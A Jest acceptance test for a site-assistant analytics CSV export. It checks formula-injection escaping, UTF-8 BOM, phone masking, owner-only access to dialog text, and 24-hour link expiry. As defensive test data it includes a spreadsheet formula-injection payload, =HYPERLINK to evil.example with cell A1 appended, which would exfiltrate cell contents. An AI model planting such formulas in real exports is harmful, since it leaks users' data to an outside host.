/**
 * Приёмка Э3 (A) — экспорт CSV (ТЗ §5-тер.7, §5-тер.16 п.8): ячейка
 * `=HYPERLINK(...)` из текста посетителя выгружается экранированной; файл —
 * UTF-8 с BOM (кириллица в Excel); текст реплик — только владелец и только
 * маскированный; крон формирует файл в приватный Blob, ссылка 24 ч, потом
 * expired и файл удалён; запрос — в журнал кабинета; scope своих сайтов.
 */
import { analyticsCodeOf } from '../../modules/assist-analytics/analytics-errors';
import { CSV_BOM } from '../../modules/assist-analytics/csv';
import {
  addDays,
  dayInTz,
  dayRangeUtc,
} from '../../modules/assist-analytics/site-time';
import {
  AnalyticsStack,
  LogCapture,
} from '../../modules/assist-analytics/testing/analytics-stack.testing';
import { describeDb } from '../../modules/assist-sandbox/testing/k3-stack.testing';

jest.setTimeout(60_000);

const HOUR = 60 * 60 * 1000;
const TZ = 'Europe/Kyiv';
const EVIL = '=HYPERLINK("https://evil.example/x?d="&A1,"Подробнее")';

describeDb('Приёмка Э3 (A): экспорт CSV — §5-тер.16 п.8', () => {
  const st = new AnalyticsStack();
  const logs = new LogCapture();
  beforeAll(async () => {
    logs.install();
    await st.init();
  });
  afterAll(async () => {
    await st.close();
    jest.restoreAllMocks();
  });

  const day = addDays(dayInTz(new Date(), TZ), -2);
  const at = (h: number) =>
    new Date(dayRangeUtc(day, TZ).start.getTime() + h * HOUR);

  it('п.8: =HYPERLINK из текста посетителя — экранирован апострофом; BOM; кириллица; телефон в тексте — замаскирован', async () => {
    const s = await st.site();
    const owner = await st.member(s);
    const conv = await st.conversation(s, {
      createdAt: at(10),
      question: EVIL,
    });
    await st.owner.assistSiteMessage.create({
      data: {
        accountId: s.accountId,
        siteId: s.siteId,
        conversationId: conv.id,
        role: 'operator',
        text: 'Передзвоніть на +380 67 123 45 67, будь ласка',
        createdAt: at(10.2),
      },
    });
    const req = await st.exports.request(owner, s.siteId, {
      kind: 'dialogs',
      from: day,
      to: day,
      withText: true,
    });
    expect(req).toMatchObject({ status: 'queued', url: null, rows: null });
    const now = new Date();
    const r = await st.exports.process(3, now, { siteIds: [s.siteId] });
    expect(r.done).toBe(1);
    const view = await st.exports.get(owner, s.siteId, req.id);
    expect(view.status).toBe('done');
    expect(view.rows).toBe(3);
    expect(view.url).toMatch(/^https:\/\/blob\.test\/assist\//);
    expect(new Date(view.expiresAt!).getTime() - now.getTime()).toBe(24 * HOUR);
    const row = await st.owner.assistSiteExport.findUniqueOrThrow({
      where: { id: req.id },
    });
    expect(row.blobKey).toBe(
      `assist/${s.accountId}/${s.siteId}/exports/${req.id}.csv`,
    );
    const csv = st.storage.files.get(row.blobKey!)!;
    expect(Buffer.from(csv, 'utf8').subarray(0, 3)).toEqual(
      Buffer.from([0xef, 0xbb, 0xbf]),
    );
    expect(csv.startsWith(`${CSV_BOM}dialog_id,`)).toBe(true);
    // Ячейка формулы — с апострофом (в кавычках из-за запятых/кавычек).
    expect(csv).toContain(
      `"'=HYPERLINK(""https://evil.example/x?d=""&A1,""Подробнее"")"`,
    );
    expect(csv).not.toMatch(/,"?=HYPERLINK/);
    expect(csv).toContain('Передзвоніть на [телефон скрыт]');
    expect(csv).not.toContain('123 45 67');
    // Ни текста, ни строк файла в логах.
    expect(logs.text()).not.toMatch(/HYPERLINK|Передзвоніть/);
  });

  it('права: текст реплик — только владелец (EXPORT_FORBIDDEN); период — STATS_RANGE_INVALID; без текста — строка на диалог', async () => {
    const s = await st.site();
    const mgr = await st.member(s, 'manager');
    await st.conversation(s, { createdAt: at(9), question: EVIL });
    const code = async (p: Promise<unknown>) =>
      p.then(
        () => null,
        (e) => analyticsCodeOf(e),
      );
    expect(
      await code(
        st.exports.request(mgr, s.siteId, {
          kind: 'dialogs',
          from: day,
          to: day,
          withText: true,
        }),
      ),
    ).toBe('EXPORT_FORBIDDEN');
    expect(
      await code(
        st.exports.request(mgr, s.siteId, {
          kind: 'daily',
          from: day,
          to: addDays(day, -1),
        }),
      ),
    ).toBe('STATS_RANGE_INVALID');
    const x = await st.exports.request(mgr, s.siteId, {
      kind: 'dialogs',
      from: day,
      to: day,
    });
    await st.exports.process(3, new Date(), { siteIds: [s.siteId] });
    const row = await st.owner.assistSiteExport.findUniqueOrThrow({
      where: { id: x.id },
    });
    expect(row.rows).toBe(1);
    expect(st.storage.files.get(row.blobKey!)).not.toContain('HYPERLINK');
    expect(
      await code(
        st.exports.get(await st.member(await st.site()), s.siteId, x.id),
      ),
    ).toBe('NOT_FOUND');
  });

  it('выгрузку с текстом реплик скачивает только владелец: менеджер видит её в списке без ссылки', async () => {
    const s = await st.site();
    const owner = await st.member(s);
    const mgr = await st.member(s, 'manager');
    await st.conversation(s, { createdAt: at(11), question: 'Де мій заказ?' });
    const x = await st.exports.request(owner, s.siteId, {
      kind: 'dialogs',
      from: day,
      to: day,
      withText: true,
    });
    const plain = await st.exports.request(owner, s.siteId, {
      kind: 'dialogs',
      from: day,
      to: day,
    });
    await st.exports.process(3, new Date(), { siteIds: [s.siteId] });
    expect((await st.exports.get(owner, s.siteId, x.id)).url).toMatch(
      /^https:\/\/blob\.test\//,
    );
    const asMgr = await st.exports.get(mgr, s.siteId, x.id);
    expect(asMgr).toMatchObject({ status: 'done', url: null });
    const list = await st.exports.list(mgr, s.siteId);
    expect(list.find((v) => v.id === x.id)?.url).toBeNull();
    // Выгрузка без текста менеджеру по-прежнему доступна.
    expect(list.find((v) => v.id === plain.id)?.url).toMatch(
      /^https:\/\/blob\.test\//,
    );
  });

  it('daily и conversions; ссылка живёт 24 ч → expired, файл удалён; журнал выгрузки остаётся', async () => {
    const s = await st.site();
    const owner = await st.member(s);
    const gid = await st.goal(s, {
      key: 'buy',
      detectors: [{ kind: 'js', config: {} }],
    });
    await st.owner.assistSiteGoalEvent.create({
      data: {
        accountId: s.accountId,
        siteId: s.siteId,
        goalId: gid,
        occurredAt: at(5),
        source: 'loader',
        trust: 'page',
        orderId: '-1+2',
        attribution: 'unassisted',
        value: 99.5,
        currency: 'UAH',
      },
    });
    await st.rollup.rollupDay(s.siteId, day);
    const d = await st.exports.request(owner, s.siteId, {
      kind: 'daily',
      from: day,
      to: day,
    });
    const c = await st.exports.request(owner, s.siteId, {
      kind: 'conversions',
      from: day,
      to: day,
    });
    const now = new Date();
    expect(
      (await st.exports.process(3, now, { siteIds: [s.siteId] })).done,
    ).toBe(2);
    const files = await st.owner.assistSiteExport.findMany({
      where: { siteId: s.siteId },
    });
    const dailyCsv = st.storage.files.get(
      files.find((f) => f.id === d.id)!.blobKey!,
    )!;
    expect(dailyCsv.split('\r\n')[1].startsWith(`${day},0,0,`)).toBe(true);
    const convCsv = st.storage.files.get(
      files.find((f) => f.id === c.id)!.blobKey!,
    )!;
    expect(convCsv).toContain(
      ",buy,buy,'-1+2,99.5,UAH,completed,page,unassisted,",
    );
    const later = new Date(now.getTime() + 25 * HOUR);
    st.exports.now = () => later;
    const r = await st.exports.process(3, later, { siteIds: [s.siteId] });
    expect(r.expired).toBe(2);
    const v = await st.exports.get(owner, s.siteId, d.id);
    expect(v).toMatchObject({ status: 'expired', url: null });
    expect(st.storage.removed.length).toBeGreaterThanOrEqual(2);
    expect(
      (await st.exports.list(owner, s.siteId)).map((x) => x.status),
    ).toEqual(['expired', 'expired']);
    st.exports.now = () => new Date();
  });
});
